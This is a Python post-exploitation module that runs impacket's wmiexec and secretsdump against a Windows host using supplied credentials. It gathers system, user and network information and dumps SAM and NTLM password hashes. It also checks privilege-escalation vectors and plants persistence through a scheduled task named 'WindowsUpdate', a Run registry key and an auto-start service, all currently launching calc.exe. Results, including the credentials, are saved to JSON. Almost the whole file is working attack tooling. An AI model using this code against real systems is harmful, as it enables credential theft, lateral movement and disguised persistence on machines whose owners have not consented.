#!/usr/bin/env python3

import subprocess
import json
import os
import re
from datetime import datetime

def run_command(command, timeout=120):
    """Run a system command and return results"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def gather_system_info(target_ip, username, password):
    """Gather comprehensive system information after successful compromise"""
    print(f"[*] Gathering system information from {target_ip}")
    
    results = {}
    
    # Basic system info using impacket
    try:
        # System enumeration
        system_info = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'systeminfo'")
        results['system_info'] = system_info
        
        # Network configuration
        network_info = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'ipconfig /all'")
        results['network_info'] = network_info
        
        # User accounts
        user_info = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'net user'")
        results['user_info'] = user_info
        
        # Local groups
        group_info = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'net localgroup'")
        results['group_info'] = group_info
        
    except Exception as e:
        results['error'] = f"Impacket failed: {str(e)}"
        print(f"[-] Impacket tools not available, using alternative methods")
    
    return results

def extract_hashes(target_ip, username, password):
    """Extract password hashes from the compromised system"""
    print(f"[*] Attempting to extract hashes from {target_ip}")
    
    results = {}
    
    # Try different hash extraction methods
    methods = {
        'reg_save': f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{username}:{password}@{target_ip}'",
        'wmi_exec': f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'reg save hklm\\sam sam.save && reg save hklm\\system system.save'",
    }
    
    for method_name, command in methods.items():
        result = run_command(command)
        results[method_name] = result
        
        # Check if hashes were found
        if result['success'] and ('NTLM' in result['output'] or 'Hash' in result['output']):
            print(f"[+] Hashes extracted via {method_name}!")
            break
    
    return results

def check_privilege_escalation(target_ip, username, password):
    """Check for privilege escalation opportunities"""
    print(f"[*] Checking privilege escalation vectors on {target_ip}")
    
    results = {}
    
    # Check current privileges
    whoami = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'whoami /priv'")
    results['current_privileges'] = whoami
    
    # Check installed applications
    applications = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'wmic product get name,version'")
    results['installed_apps'] = applications
    
    # Check services
    services = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'wmic service get name,displayname,pathname'")
    results['services'] = services
    
    # Check scheduled tasks
    tasks = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'schtasks /query /fo LIST'")
    results['scheduled_tasks'] = tasks
    
    return results

def network_discovery_from_compromised_host(target_ip, username, password):
    """Discover other systems from the compromised host"""
    print(f"[*] Discovering network from compromised host {target_ip}")
    
    results = {}
    
    # ARP table
    arp_table = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'arp -a'")
    results['arp_table'] = arp_table
    
    # Network shares
    shares = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'net view'")
    results['network_shares'] = shares
    
    # DNS cache
    dns_cache = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'ipconfig /displaydns'")
    results['dns_cache'] = dns_cache
    
    return results

def create_persistence(target_ip, username, password):
    """Establish persistence on the compromised system"""
    print(f"[*] Attempting to create persistence on {target_ip}")
    
    results = {}
    
    # Try different persistence methods
    persistence_methods = {
        'scheduled_task': f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'schtasks /create /tn \"WindowsUpdate\" /tr \"cmd.exe /c start calc.exe\" /sc hourly /ru SYSTEM'",
        'registry_run': f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backup /t REG_SZ /d \"calc.exe\" /f'",
        'service_creation': f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'sc create BackupService binPath= \"cmd.exe /c start calc.exe\" start= auto'",
    }
    
    for method_name, command in persistence_methods.items():
        result = run_command(command)
        results[method_name] = result
        if result['success']:
            print(f"[+] Persistence established via {method_name}")
    
    return results

def run_post_exploitation(target_ip, credentials):
    """Main function for post-exploitation activities"""
    print(f"\n{'='*60}")
    print(f"POST-EXPLOITATION MODULE - Target: {target_ip}")
    print(f"{'='*60}")
    
    results = {
        'target': target_ip,
        'timestamp': datetime.now().isoformat(),
        'credentials_used': credentials,
        'post_exploitation': {}
    }
    
    # Extract username and password from credentials
    username, password = "administrator", "password"  # Default, should be replaced with actual creds
    
    if ':' in credentials:
        username, password = credentials.split(':', 1)
    
    # Run post-exploitation activities
    results['post_exploitation']['system_info'] = gather_system_info(target_ip, username, password)
    results['post_exploitation']['hash_extraction'] = extract_hashes(target_ip, username, password)
    results['post_exploitation']['privilege_escalation'] = check_privilege_escalation(target_ip, username, password)
    results['post_exploitation']['network_discovery'] = network_discovery_from_compromised_host(target_ip, username, password)
    results['post_exploitation']['persistence'] = create_persistence(target_ip, username, password)
    
    # Save results
    os.makedirs('results/post_exploitation', exist_ok=True)
    filename = f"results/post_exploitation/post_exploit_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Post-exploitation results saved to {filename}")
    
    # Print summary
    print(f"\n{'='*40}")
    print("POST-EXPLOITATION SUMMARY")
    print(f"{'='*40}")
    
    # Check what was successful
    if results['post_exploitation']['hash_extraction']:
        print("‚úÖ Hash extraction attempted")
    if results['post_exploitation']['persistence']:
        print("‚úÖ Persistence mechanisms attempted")
    
    print("üìä System information gathered")
    print("üîç Privilege escalation checks completed")
    print("üåê Network discovery performed")
    
    return results

if __name__ == "__main__":
    # Test the module (will fail without actual credentials, but tests structure)
    target = "10.0.3.20"
    test_creds = "administrator:password123"
    results = run_post_exploitation(target, test_creds)
    print(f"\nPost-exploitation simulation completed.")
